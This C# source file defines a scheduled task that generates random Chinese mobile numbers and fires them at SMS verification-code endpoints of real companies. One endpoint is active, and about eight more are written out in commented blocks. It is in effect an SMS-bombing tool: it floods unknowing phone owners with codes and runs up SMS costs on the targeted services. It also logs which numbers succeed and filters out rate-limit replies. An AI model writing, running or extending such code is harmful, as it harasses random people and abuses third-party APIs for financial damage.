using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using Coravel.Invocable;
using IdGen;
using Microsoft.Extensions.Logging;
using Newtonsoft.Json;

namespace ASF.Domain.Services;

/// <summary>
///   定时发送短信任务
/// </summary>
public class RunSendPhoneTasks : IInvocable
{
  private readonly ILogger<RunSendPhoneTasks> _logger;

  /// <summary>
  ///   定时发送短信任务
  /// </summary>
  public RunSendPhoneTasks(ILogger<RunSendPhoneTasks> logger)
  {
    _logger = logger;
  }

  /// <summary>
  ///   激活定时任务
  /// </summary>
  /// <returns></returns>
  public async Task Invoke()
  {
    var generatorId = new Random().Next(0, 1023);
    // Let's say we take april 1st 2015 as our epoch
    var epoch = new DateTime(2020, 4, 1, 0, 0, 0, DateTimeKind.Utc);
    // Create a mask configuration of 45 bits for timestamp, 2 for generator-id 
    // and 16 for sequence
    var mc = new IdStructure(41, 10, 12);
    // Create an IdGenerator with it's generator-id set to 0, our custom epoch 
    // and mask configuration
    var options = new IdGeneratorOptions(mc, new DefaultTimeSource(epoch));
    var generator = new IdGenerator(generatorId, options);
    /*
    // 克徕帝
    var sendUrl2 =
      "https://newapplet.crd.cn/Api/Member/Member/SendNewMobileCode?mobile={0}&source=MP-WEIXIN&openid=oTZkE5KTYsIlSTh1gKZ223jeovfI";
    // lihang 
    var senLingHang = "https://study.mshengedu.com/study/sys/validCode/getCode";
    // 展通安全
    // string sendZtUrl = "https://tnwgh.hnztaqkj.com/Home/SendSmsForResetPwd";
    var sendZtUrl = "https://tnwgh.hnztaqkj.com/wxapis/Home/SendSmsForResetPwd";
    // 卓帮医药
    // string zhuobang = "https://www.pianyibang.shop/api/sendsms/";
    // 展通1
    var zt =
      "https://edu.hnztaqkj.com/api/api-cms/employee/sendActivateSms?verifyPhone={0}&verifyCode=111&protocolChecked=false";
    // //公寓宝
    // var gyb = "https://rent.kilo-coin.com/renting/app/smscode/wxOwnerLogin/{0}";
    // 溪玮云商
    var xwys = "https://api1.xiweicloud.cn/xiwei2/FrontEnd/UserSmsSend";
    //师说
    // string shUrl = "https://api.52cxy.cn/1/passport/captcha.json";
    // string shUrl1 = "https://api.shishuo.com/passport/captcha.json";
    var ssUrl = "https://www.oinone.top/pamirs/base";
    // // 企名片
    // var qmpUrl = "https://businessapi.qimingpian.cn/Login/sendVerifyCode";
    */
    //擎识科技
    string qs = "https://api.chinnshi.com/basis/verify/get?phone={0}&type=1";
    //随机的手机号码
    var phoneList = new[]
    {
      "130", "131", "132", "133", "134", "135", "136", "137", "138", "139", "151", "152", "153", "153", "154", "155",
      "156", "157", "158", "159", "181", "182", "183", "184", "185", "186", "187", "188", "189"
    };
    for (var i = 0; i < phoneList.Length; i++)
    {
      var genid = generator.CreateId();
      var phone = new[] { genid.ToString().Substring(0, 8), genid.ToString().Substring(8, 8) };
      for (var j = 0; j < phone.Length; j++)
      {
        var data = phoneList[i] + phone[j];
        using (var http = new HttpClient())
        {
          var response2 = await http.GetAsync(new Uri(string.Format(qs, data)));
          if (response2.IsSuccessStatusCode)
          {
            var t = await response2.Content.ReadAsStringAsync();
            _logger.LogInformation($"擎识科技：{t}");
          }
          //暂时全部注释
          /*
          var urlFormat = string.Format(sendUrl2, data);
          //短信发送1
          var kldRes = await http.GetAsync(new Uri(urlFormat));
          if (kldRes.IsSuccessStatusCode)
          {
            var t = await kldRes.Content.ReadAsStringAsync();
            _logger.LogInformation($"克徕帝:{t}");
          }

          // var response2 = await http.GetAsync(new Uri(string.Format(gyb, data)));
          // if (response2.IsSuccessStatusCode)
          // {
          //   var t = await response2.Content.ReadAsStringAsync();
          //   _logger.LogInformation($"公寓宝：{t}");
          // }
          
        
          var httpContent1 = new StringContent(
            JsonConvert.SerializeObject(new { phone = data, validType = "DL" }),
            Encoding.UTF8, "application/json");
          var response3 = await http.PostAsync(new Uri(senLingHang), httpContent1);
          if (response3.IsSuccessStatusCode)
          {
            var t = await response3.Content.ReadAsStringAsync();
            if (!t.Contains("抱歉，手机号尚未注册，暂不支持使用！") && !t.Contains("操作过于频繁，请稍后重试"))
              _logger.LogInformation($"领航未来教育: {t}");
          }



          var ztHttpContent = new FormUrlEncodedContent(new Dictionary<string, string>
          {
            ["loginName"] = data,
            ["minutes"] = "1"
          });
          var ztResponse = await http.PostAsync(new Uri(sendZtUrl), ztHttpContent);
          if (ztResponse.IsSuccessStatusCode)
          {
            var t = await ztResponse.Content.ReadAsStringAsync();
            if (!t.Contains("400")) _logger.LogInformation($"展通安全成功{t}");
          }


          // var qmpHttpContent = new FormUrlEncodedContent(new Dictionary<string, string>
          // {
          //   ["mobile"] = $"86{data}",
          //   ["token"] = "",
          //   ["item_uuid"] = ""
          // });
          // var qmpResponse = await http.PostAsync(new Uri(qmpUrl), qmpHttpContent);
          // if (qmpResponse.IsSuccessStatusCode)
          // {
          //   var t = await qmpResponse.Content.ReadAsStringAsync();
          //
          //   _logger.LogInformation($"企名片{t}");
          // }
        
          

          // FormUrlEncodedContent httpContent5 = new FormUrlEncodedContent(new Dictionary<string, string>()
          // {
          //   ["mobile"] = data,
          //   // ["merchid"] = "a5463a3c-8611-45b1-b6c9-57a22fe3c2a2"
          // });
          // HttpResponseMessage response7 = await http.PostAsync(new Uri(zhuobang), httpContent5);
          // if (response7.IsSuccessStatusCode)
          // {
          //   string t = await response7.Content.ReadAsStringAsync();
          //   
          //   _logger.LogInformation($"卓帮医药: {t}");
          // }

          var url = string.Format(zt, data);
          var response8 = await http.GetAsync(new Uri(url));
          if (response8.IsSuccessStatusCode)
          {
            var t = await response8.Content.ReadAsStringAsync();
            if (!t.Contains("500")) _logger.LogInformation($"展通安全1：{t}");
          }
          

          var xwhttpContent = new StringContent(
            JsonConvert.SerializeObject(new { mobile = data, type = "1" }),
            Encoding.UTF8, "application/json");
          var response17 = await http.PostAsync(new Uri(xwys), xwhttpContent);
          if (response17.IsSuccessStatusCode)
          {
            var t = await response17.Content.ReadAsStringAsync();
            _logger.LogInformation($"溪玮云商: {t}");
          }

          // //师说
          // var shContent = new FormUrlEncodedContent(new Dictionary<string, string>
          // {
          //   ["code"] = "+86",
          //   ["mobile"] = data
          // });
          // HttpResponseMessage shResponse = await http.PostAsync(new Uri(shUrl), shContent);
          // if (shResponse.IsSuccessStatusCode)
          // {
          //   string t = await shResponse.Content.ReadAsStringAsync();
          //   
          //   _logger.LogInformation($"师说{t}");
          // }
          // HttpResponseMessage shResponse1 = await http.PostAsync(new Uri(shUrl1), shContent);
          // if (shResponse1.IsSuccessStatusCode)
          // {
          //   string t = await shResponse1.Content.ReadAsStringAsync();
          //   
          //   _logger.LogInformation($"师说1{t}");
          // }

          var query =
            "\n    mutation{\n      welcomeUserModuleMutation {\n        registerVerificationCode(user:{\n          phone:" +
            $"\"{data}\"" + ",\n        }) {\n          nickname\n          isBind\n        }\n      }\n    }\n  ";
          var obj = new
          {
            operationName = string.Empty,
            query,
            variables = new { }
          };
          var sshttpContent = new StringContent(
            JsonConvert.SerializeObject(obj),
            Encoding.UTF8, "application/json");
          //短信发送1
          var ssRes = await http.PostAsync(new Uri(ssUrl), sshttpContent);
          if (ssRes.IsSuccessStatusCode)
          {
            var t = await ssRes.Content.ReadAsStringAsync();
            _logger.LogInformation($"数式:{t}");
          }*/
        }
      }
    }
  }
}